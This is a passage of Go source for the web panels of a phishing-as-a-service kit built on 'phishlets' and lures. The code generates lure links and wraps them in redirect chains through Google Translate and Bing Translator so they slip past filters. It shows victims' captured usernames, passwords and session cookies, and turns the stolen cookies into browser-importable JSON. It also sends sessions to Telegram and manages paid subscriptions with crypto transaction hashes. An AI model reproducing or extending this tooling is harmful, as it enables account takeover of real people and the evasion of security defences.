					if pu, err := pl.GetLureUrl(l.Path); err == nil {
						lureURL = pu
					}
				}

				lureURLCell := `<span style="color:var(--t3)">—</span>`
				if lureURL != "" {
					lureURLCell = fmt.Sprintf(`<div class="url-cell">%s</div>
<button class="btn btn-ghost btn-xs" style="margin-top:4px" onclick="cp(this)" data-copy="%s">Copy URL</button>`,
						template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
				}

				redirectCell := `<span style="color:var(--t3)">—</span>`
				if l.RedirectUrl != "" {
					redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>`,
						template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 36)))
				}

				userCell := `<span style="color:var(--t3)">unassigned</span>`
				if l.UserId != "" {
					userCell = fmt.Sprintf(`<span class="badge badge-blue">%s</span>`, template.HTMLEscapeString(l.UserId))
				}

				chainCell := `<span style="color:var(--t3)">—</span>`
				if lureURL != "" {
					parsedURL, err := url.Parse(lureURL)
					if err == nil {
						phishBase := parsedURL.Scheme + "://" + parsedURL.Host
						outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
						if err == nil {
							translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
							bingLink := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)

							chainCell = fmt.Sprintf(`<details>
<summary>▶ Generate Chain</summary>
<div class="chain-box">
  <div class="chain-label">Google Translate</div>
  <div class="chain-link">%s
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Bing Translator</div>
  <div class="chain-link">%s
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Direct Chain</div>
  <div class="chain-link">%s
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label" style="margin-top:8px">Hops</div>`,
								template.HTMLEscapeString(truncateStr(translateLink, 56)), template.HTMLEscapeString(translateLink),
								template.HTMLEscapeString(truncateStr(bingLink, 56)), template.HTMLEscapeString(bingLink),
								template.HTMLEscapeString(truncateStr(outer, 56)), template.HTMLEscapeString(outer),
							)
							for j, hop := range hops {
								chainCell += fmt.Sprintf(`<div class="chain-hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
							}
							chainCell += fmt.Sprintf(`<div class="chain-hop" style="color:var(--green)">final → %s</div></div></details>`, template.HTMLEscapeString(lureURL))
						}
					}
				}

				userOptions := `<option value="-">— unassign —</option>`
				for _, u := range userList {
					sel := ""
					if u.Username == l.UserId {
						sel = " selected"
					}
					userOptions += fmt.Sprintf(`<option value="%s"%s>%s</option>`,
						template.HTMLEscapeString(u.Username), sel, template.HTMLEscapeString(u.Username))
				}
				assignForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures" style="display:flex;gap:5px;align-items:center;margin-top:4px">
<input type="hidden" name="action" value="assign_lure">
<input type="hidden" name="lure_id" value="%d">
<select name="username" style="font-size:11.5px;padding:4px 7px">%s</select>
<button type="submit" class="btn btn-ghost btn-xs">Save</button>
</form>`, i, userOptions)

				editForm := fmt.Sprintf(`<details style="margin-top:4px">
<summary style="cursor:pointer">⚙ Edit</summary>
<form method="POST" action="/admin/panel?tab=lures" style="margin-top:8px;padding:12px;background:rgba(255,255,255,.02);border-radius:4px;border:1px solid var(--brd)">
<input type="hidden" name="action" value="edit_lure">
<input type="hidden" name="lure_id" value="%d">
<div class="field" style="margin-bottom:8px">
  <label class="field-label">Custom Hostname</label>
  <input type="text" name="hostname" value="%s" placeholder="sub.yourdomain.com" style="font-size:11px">
</div>
<div class="field" style="margin-bottom:8px">
  <label class="field-label">Redirect URL</label>
  <input type="text" name="redirect_url" value="%s" placeholder="https://example.com" style="font-size:11px">
</div>
<div class="field" style="margin-bottom:8px">
  <label class="field-label">Redirector</label>
  <input type="text" name="redirector" value="%s" placeholder="html redirector page" style="font-size:11px">
</div>
<button type="submit" class="btn btn-primary btn-xs">Save Changes</button>
</form>
</details>`, i, template.HTMLEscapeString(l.Hostname), template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(l.Redirector))

				deleteLureBtn := fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=lures" onsubmit="return confirm('Delete lure %d?')">
<input type="hidden" name="action" value="delete_lure">
<input type="hidden" name="lure_id" value="%d">
<button type="submit" class="btn btn-danger btn-xs">Delete</button>
</form>`, i, i)

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td><span class="badge badge-purple">%s</span><br><span style="color:var(--t3);font-size:11px">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s<br>%s</td>
<td>%s</td>
<td>%s<br>%s</td>
</tr>`, i,
					template.HTMLEscapeString(l.Phishlet),
					phishletFriendlyName(l.Phishlet),
					lureURLCell, redirectCell,
					userCell, assignForm,
					chainCell,
					editForm,
					deleteLureBtn,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)

	// ── SESSIONS ──────────────────────────────────────────────────────────────
	case "sessions":
		b.WriteString(`<div class="section">`)
		hideBots := r.URL.Query().Get("hide_bots") == "1"
		displaySessions := allSessions
		if hideBots {
			var filtered []*database.Session
			for _, sess := range allSessions {
				hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0
				if sess.Password != "" || hasTokens {
					filtered = append(filtered, sess)
				}
			}
			displaySessions = filtered
		}
		toggleURL := "/admin/panel?tab=sessions&hide_bots=1"
		toggleLabel := "Hide Bots"
		if hideBots {
			toggleURL = "/admin/panel?tab=sessions"
			toggleLabel = "Show All"
		}
		b.WriteString(sectionHd(fmt.Sprintf("All Sessions (%d) &nbsp;<a href=\"%s\" class=\"btn btn-xs\" style=\"font-size:11px\">%s</a>", len(displaySessions), toggleURL, toggleLabel)))
		if len(displaySessions) == 0 {
			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
		} else {
			b.WriteString(sessionTable(displaySessions, true))
		}
		b.WriteString(`</div>`)

	// ── BLACKLIST ─────────────────────────────────────────────────────────────
	case "blacklist":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Block IP / CIDR"))
		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_add">
<div class="form-row">
  <input type="text" name="ip" placeholder="1.2.3.4 or 1.2.3.0/24" style="width:280px">
  <button type="submit" class="btn btn-danger btn-sm">Block</button>
</div></form></div></div>`)

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Blocked Entries"))
		if GlobalBlacklist == nil {
			b.WriteString(`<div class="empty">Blacklist not loaded.</div>`)
		} else {
			ips := make([]string, 0, len(GlobalBlacklist.ips))
			for k := range GlobalBlacklist.ips {
				ips = append(ips, k)
			}
			if len(ips) == 0 && len(GlobalBlacklist.masks) == 0 {
				b.WriteString(`<div class="empty">No IPs blocked yet.</div>`)
			} else {
				b.WriteString(`<div class="table-wrap"><table><thead><tr><th>IP / CIDR</th><th>Type</th><th></th></tr></thead><tbody>`)
				for _, ip := range ips {
					b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-gray">IP</span></td>
<td>
<form class="inline" method="POST" action="/admin/panel?tab=blacklist">
<input type="hidden" name="action" value="blacklist_remove">
<input type="hidden" name="ip" value="%s">
<button type="submit" class="btn btn-ghost btn-xs">Remove</button>
</form></td></tr>`, template.HTMLEscapeString(ip), template.HTMLEscapeString(ip)))
				}
				for _, m := range GlobalBlacklist.masks {
					if m.mask != nil {
						b.WriteString(fmt.Sprintf(`<tr>
<td class="mono">%s</td>
<td><span class="badge badge-amber">CIDR</span></td>
<td><span style="color:var(--t3);font-size:11px">auto-blocked</span></td>
</tr>`, template.HTMLEscapeString(m.mask.String())))
					}
				}
				b.WriteString(`</tbody></table></div>`)
			}
		}
		b.WriteString(`</div>`)

	// ── TELEGRAM BOT ──────────────────────────────────────────────────────────
	case "telegram":
		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd("Bot Configuration"))
		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="save_bot_config">
<div class="form-grid">
  <div class="field field-full"><label class="field-label">Bot Token (from @BotFather)</label><input type="text" name="bot_token" placeholder="1234567890:AABBCCddEEff..." value="%s"></div>
  <div class="field"><label class="field-label">Admin Chat ID</label><input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d"></div>
</div>
<button type="submit" class="btn btn-blue">Save Config</button>
<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Token change requires restart</span>
</form></div></div>`,
			template.HTMLEscapeString(s.Cfg.GetBotToken()),
			s.Cfg.GetBotAdminChatId(),
		))

		b.WriteString(`<div class="section">`)
		b.WriteString(sectionHd(fmt.Sprintf("Subscriptions (%d)", len(allSubs))))
		if len(allSubs) == 0 {
			b.WriteString(`<div class="empty">No subscriptions yet.</div>`)
		} else {
			b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>ID</th><th>Chat ID</th><th>Service</th><th>Status</th><th>TX Hash</th><th>Expires</th><th>Links</th><th>Actions</th>
</tr></thead><tbody>`)
			for _, sub := range allSubs {
				statusBadge := `<span class="badge badge-gray">` + template.HTMLEscapeString(sub.Status) + `</span>`
				switch sub.Status {
				case "active":
					statusBadge = `<span class="badge badge-green">active</span>`
				case "pending":
					statusBadge = `<span class="badge badge-amber">pending</span>`
				case "expired":
					statusBadge = `<span class="badge badge-red">expired</span>`
				}

				expiry := `<span style="color:var(--t3)">—</span>`
				if sub.ExpiresAt > 0 {
					expiry = time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")
				}

				txCell := `<span style="color:var(--t3)">—</span>`
				if sub.TxHash != "" {
					txCell = fmt.Sprintf(`<span class="mono" style="font-size:11px">%s</span>`, template.HTMLEscapeString(truncateStr(sub.TxHash, 18)))
				}

				linksCell := `<span style="color:var(--t3)">—</span>`
				if sub.ChainTranslate != "" || sub.LureURL != "" {
					linksCell = `<details><summary>▶ links</summary><div class="chain-box">`
					if sub.LureURL != "" {
						linksCell += fmt.Sprintf(`<div class="chain-label">Direct URL</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(sub.LureURL, 40)), template.HTMLEscapeString(sub.LureURL))
					}
					if sub.ChainTranslate != "" {
						linksCell += fmt.Sprintf(`<div class="chain-label">Google Translate</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(sub.ChainTranslate, 40)), template.HTMLEscapeString(sub.ChainTranslate))
					}
					if sub.ChainBing != "" {
						linksCell += fmt.Sprintf(`<div class="chain-label">Bing Translator</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(sub.ChainBing, 40)), template.HTMLEscapeString(sub.ChainBing))
					}
					linksCell += `</div></details>`
				}

				actions := ""
				if sub.Status == "pending" {
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="approve_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn btn-green btn-xs">✓ Approve</button>
</form> `, sub.Id)
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
<input type="hidden" name="action" value="reject_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn btn-ghost btn-xs">✗ Reject</button>
</form>`, sub.Id)
				} else {
					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram" onsubmit="return confirm('Delete subscription %d?')">
<input type="hidden" name="action" value="delete_sub">
<input type="hidden" name="sub_id" value="%d">
<button type="submit" class="btn btn-danger btn-xs">Delete</button>
</form>`, sub.Id, sub.Id)
				}

				b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td class="mono">%d</td>
<td><span class="badge badge-purple">%s</span><br><span style="color:var(--t3);font-size:11px">%s</span></td>
<td>%s</td>
<td>%s</td>
<td class="mono" style="font-size:11.5px">%s</td>
<td>%s</td>
<td>%s</td>
</tr>`,
					sub.Id, sub.TelegramChatId,
					template.HTMLEscapeString(sub.Phishlet),
					phishletFriendlyName(sub.Phishlet),
					statusBadge, txCell, expiry, linksCell, actions,
				))
			}
			b.WriteString(`</tbody></table></div>`)
		}
		b.WriteString(`</div>`)
	}

	nav := `<a href="/admin/panel?tab=overview" class="topbar-link">Overview</a>
<a href="/admin/panel?tab=sessions" class="topbar-link">Sessions</a>
<a href="/admin/panel?tab=lures" class="topbar-link">Lures</a>
<a href="/admin/panel?tab=telegram" class="topbar-link">Telegram</a>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("Admin Panel", nav, b.String()))
}

// ───────────────────────────── User Panel ──────────────────────────────────

func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
	if len(parts) < 2 {
		http.NotFound(w, r)
		return
	}
	token := parts[1]

	user, err := s.Db.UserGetByToken(token)
	if err != nil {
		http.Error(w, "Invalid panel token", http.StatusForbidden)
		return
	}

	lures := s.Cfg.GetLuresByUser(user.Username)
	sessions, _ := s.Db.ListSessions()

	userPhishlets := map[string]bool{}
	for _, l := range lures {
		userPhishlets[l.Phishlet] = true
	}
	var userSessions []*database.Session
	for _, sess := range sessions {
		if userPhishlets[sess.Phishlet] {
			userSessions = append(userSessions, sess)
		}
	}

	totalTokens := 0
	for _, sess := range userSessions {
		if len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0 {
			totalTokens++
		}
	}

	var b strings.Builder

	b.WriteString(fmt.Sprintf(`<div style="margin-bottom:22px">
<h2 style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px">Welcome back, %s</h2>
<p style="color:var(--t3);font-size:12.5px">Your personal phishing panel</p>
</div>`, template.HTMLEscapeString(user.Username)))

	b.WriteString(fmt.Sprintf(`<div class="stats" style="margin-bottom:24px">
  <div class="stat"><div class="stat-n" style="color:var(--cyan)">%d</div><div class="stat-l">Lures</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--t1)">%d</div><div class="stat-l">Sessions</div></div>
  <div class="stat"><div class="stat-n" style="color:var(--green)">%d</div><div class="stat-l">With Tokens</div></div>
</div>`, len(lures), len(userSessions), totalTokens))

	b.WriteString(`<div class="section">`)
	b.WriteString(sectionHd("Your Lures"))
	if len(lures) == 0 {
		b.WriteString(`<div class="empty">No lures assigned to your account yet.</div>`)
	} else {
		b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>#</th><th>Phishlet</th><th>Lure URL</th><th>Redirect URL</th><th>Chain Links</th>
</tr></thead><tbody>`)
		for i, l := range lures {
			lureURL := ""
			if l.Hostname != "" {
				lureURL = "https://" + l.Hostname + l.Path
			} else if pl, err := s.Cfg.GetPhishlet(l.Phishlet); err == nil {
				if pu, err := pl.GetLureUrl(l.Path); err == nil {
					lureURL = pu
				}
			}

			lureURLCell := `<span style="color:var(--t3)">—</span>`
			if lureURL != "" {
				lureURLCell = fmt.Sprintf(`<div class="url-cell">%s</div>
<button class="btn btn-ghost btn-xs" style="margin-top:4px" onclick="cp(this)" data-copy="%s">Copy URL</button>`,
					template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
			}

			redirectCell := `<span style="color:var(--t3)">—</span>`
			if l.RedirectUrl != "" {
				redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>`,
					template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 40)))
			}

			chainCell := `<span style="color:var(--t3)">—</span>`
			if lureURL != "" {
				parsedURL, err := url.Parse(lureURL)
				if err == nil {
					phishBase := parsedURL.Scheme + "://" + parsedURL.Host
					outer, hops, err := GenerateRedirectChain(phishBase, lureURL, 3, s.Cfg.GetRedirectChainSecret())
					if err == nil {
						translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
						bingLink2 := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)

						chainCell = fmt.Sprintf(`<details>
<summary>▶ Show chain links</summary>
<div class="chain-box">
  <div class="chain-label">Google Translate</div>
  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Bing Translator</div>
  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>
  <div class="chain-label">Direct Chain</div>
  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
							template.HTMLEscapeString(truncateStr(translateLink, 55)), template.HTMLEscapeString(translateLink),
							template.HTMLEscapeString(truncateStr(bingLink2, 55)), template.HTMLEscapeString(bingLink2),
							template.HTMLEscapeString(truncateStr(outer, 55)), template.HTMLEscapeString(outer),
						)
						for j, hop := range hops {
							chainCell += fmt.Sprintf(`<div class="chain-hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
						}
						chainCell += `</div></details>`
					}
				}
			}

			b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td><span class="badge badge-purple">%s</span></td>
<td>%s</td>
<td>%s</td>
<td>%s</td>
</tr>`, i, template.HTMLEscapeString(l.Phishlet), lureURLCell, redirectCell, chainCell))
		}
		b.WriteString(`</tbody></table></div>`)
	}
	b.WriteString(`</div>`)

	b.WriteString(`<div class="section">`)
	b.WriteString(sectionHd(fmt.Sprintf("Captured Sessions (%d)", len(userSessions))))
	if len(userSessions) == 0 {
		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
	} else {
		b.WriteString(sessionTable(userSessions, false))
	}
	b.WriteString(`</div>`)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, panelPage("User Panel", "", b.String()))
}

// ───────────────────────────── Shared helpers ──────────────────────────────

func sectionHd(title string) string {
	return fmt.Sprintf(`<div class="section-hd"><span class="section-title">%s</span><div class="section-line"></div></div>`, title)
}

func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenPerUser map[string]int) string {
	if len(userList) == 0 {
		return `<div class="empty">No users yet.</div>`
	}
	var b strings.Builder
	b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>Username</th><th>Panel URL</th><th>Lures</th><th>Sessions</th><th>Tokens</th><th>Created</th><th></th>
</tr></thead><tbody>`)
	for _, u := range userList {
		lureCount := 0
		for _, l := range allLures {
			if l.UserId == u.Username {
				lureCount++
			}
		}
		panelURL := fmt.Sprintf("/panel/%s", u.Token)
		b.WriteString(fmt.Sprintf(`<tr>
<td><span class="badge badge-blue">%s</span></td>
<td>
  <a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>
  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button>
</td>
<td class="mono" style="color:var(--t2)">%d</td>
<td class="mono" style="color:var(--t2)">%d</td>
<td class="mono" style="color:var(--green);font-weight:700">%d</td>
<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
<td>
  <form class="inline" method="POST" action="/admin/panel?tab=users" onsubmit="return confirm('Delete %s?')">
    <input type="hidden" name="action" value="delete_user">
    <input type="hidden" name="id" value="%d">
    <button type="submit" class="btn btn-danger btn-xs">Delete</button>
  </form>
</td></tr>`,
			template.HTMLEscapeString(u.Username),
			panelURL, truncateStr(panelURL, 40), panelURL,
			lureCount,
			sessPerUser[u.Username],
			tokenPerUser[u.Username],
			time.Unix(u.CreatedAt, 0).Format("2006-01-02"),
			template.HTMLEscapeString(u.Username),
			u.Id,
		))
	}
	b.WriteString(`</tbody></table></div>`)
	return b.String()
}

func sessionTable(sessions []*database.Session, showDelete bool) string {
	var b strings.Builder
	b.WriteString(`<div class="table-wrap"><table><thead><tr>
<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>Tokens</th><th>Remote IP</th><th>Time</th><th>Detail</th>`)
	if showDelete {
		b.WriteString(`<th></th>`)
	}
	b.WriteString(`</tr></thead><tbody>`)
	for _, sess := range sessions {
		hasCreds := sess.Username != "" || sess.Password != ""
		hasTokens := len(sess.CookieTokens) > 0 || len(sess.BodyTokens) > 0 || len(sess.HttpTokens) > 0

		// Skip empty sessions (no credentials, no tokens)
		if !hasCreds && !hasTokens {
			continue
		}

		tokenBadge := `<span class="badge badge-gray">none</span>`
		if hasTokens {
			tokenBadge = `<span class="badge badge-green">● captured</span>`
		}

		uname := template.HTMLEscapeString(sess.Username)
		if uname == "" {
			uname = `<span style="color:var(--t3)">—</span>`
		}
		pass := template.HTMLEscapeString(sess.Password)
		if pass == "" {
			pass = `<span style="color:var(--t3)">—</span>`
		}

		detail := `<span style="color:var(--t3)">—</span>`
		if hasCreds || hasTokens {
			sessionVal := "N/A"
			for _, v := range sess.BodyTokens {
				sessionVal = v
				break
			}
			if sessionVal == "N/A" {
				for _, v := range sess.HttpTokens {
					sessionVal = v
					break
				}
			}

			type browserCookie struct {
				Path           string `json:"path"`
				Domain         string `json:"domain"`
				ExpirationDate int64  `json:"expirationDate"`
				Value          string `json:"value"`
				Name           string `json:"name"`
				HttpOnly       bool   `json:"httpOnly"`
			}
			var cookies []browserCookie
			defaultExpiry := sess.UpdateTime + 2592000
			for domain, tokenMap := range sess.CookieTokens {
				if len(domain) > 0 && domain[0] != '.' {
					domain = "." + domain
				}
				for _, ct := range tokenMap {
					expiry := ct.ExpiresAt
					if expiry == 0 {
						expiry = defaultExpiry
					}
					cookies = append(cookies, browserCookie{
						Path:           ct.Path,
						Domain:         domain,
						ExpirationDate: expiry,
						Value:          ct.Value,
						Name:           ct.Name,
						HttpOnly:       ct.HttpOnly,
					})
				}
			}
			cookieJSON, _ := json.MarshalIndent(cookies, "", "    ")

			infoText := fmt.Sprintf("Username: %s\nPassword: %s\nSession: %s\n\nINFO.TXT\n\nConverted JSON:\n%s",
				sess.Username, sess.Password, sessionVal, string(cookieJSON))

			detail = fmt.Sprintf(`<details>
<summary>▶ view tokens</summary>
<pre>%s</pre>
</details>`, template.HTMLEscapeString(infoText))
		}

		b.WriteString(fmt.Sprintf(`<tr>
<td class="mono" style="color:var(--t3)">%d</td>
<td><span class="badge badge-purple">%s</span></td>
<td class="mono">%s</td>
<td class="mono">%s</td>
<td>%s</td>
<td class="mono" style="color:var(--t2)">%s</td>
<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
<td>%s</td>`,
			sess.Id,
			template.HTMLEscapeString(sess.Phishlet),
			uname, pass, tokenBadge,
			template.HTMLEscapeString(sess.RemoteAddr),
			time.Unix(sess.UpdateTime, 0).Format("Jan 2 15:04"),
			detail,
		))
		b.WriteString(fmt.Sprintf(`<td>
<form class="inline" method="POST" action="/admin/panel?tab=sessions">
<input type="hidden" name="action" value="send_telegram">
<input type="hidden" name="session_id" value="%d">
<button type="submit" class="btn btn-xs" style="background:var(--accent);color:#fff">TG</button>
</form></td>`, sess.Id))
		if showDelete {
			b.WriteString(fmt.Sprintf(`<td>
<form class="inline" method="POST" action="/admin/panel?tab=sessions">
<input type="hidden" name="action" value="delete_session">
<input type="hidden" name="session_id" value="%d">
<button type="submit" class="btn btn-danger btn-xs">Del</button>
</form></td>`, sess.Id))
		}
		b.WriteString(`</tr>`)
	}
	b.WriteString(`</tbody></table></div>`)
	return b.String()
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func createLureForm(phishletNames []string, userList []*database.User) string {
	if len(phishletNames) == 0 {
		return `<div class="empty">No phishlets loaded. Add phishlet YAML files to the phishlets directory first.</div>`
	}
	opts := ""
	for _, name := range phishletNames {
		opts += fmt.Sprintf(`<option value="%s">%s — %s</option>`,
			template.HTMLEscapeString(name),
			template.HTMLEscapeString(name),
			phishletFriendlyName(name))
	}
	userOpts := `<option value="">— no user —</option>`
	for _, u := range userList {
		userOpts += fmt.Sprintf(`<option value="%s">%s</option>`,
			template.HTMLEscapeString(u.Username), template.HTMLEscapeString(u.Username))
	}
	return fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=lures">
<input type="hidden" name="action" value="create_lure">
<div class="form-grid">
  <div class="field"><label class="field-label">Phishlet</label><select name="phishlet" required>%s</select></div>
  <div class="field"><label class="field-label">Path (auto if empty)</label><input type="text" name="path" placeholder="/abc12345"></div>
  <div class="field"><label class="field-label">Redirect URL (optional)</label><input type="text" name="redirect_url" placeholder="https://..."></div>
  <div class="field"><label class="field-label">Assign to User</label><select name="user_id">%s</select></div>
  <div class="field" style="justify-content:flex-end"><button type="submit" class="btn btn-primary">+ Create Lure</button></div>
</div>
</form></div>`, opts, userOpts)
}
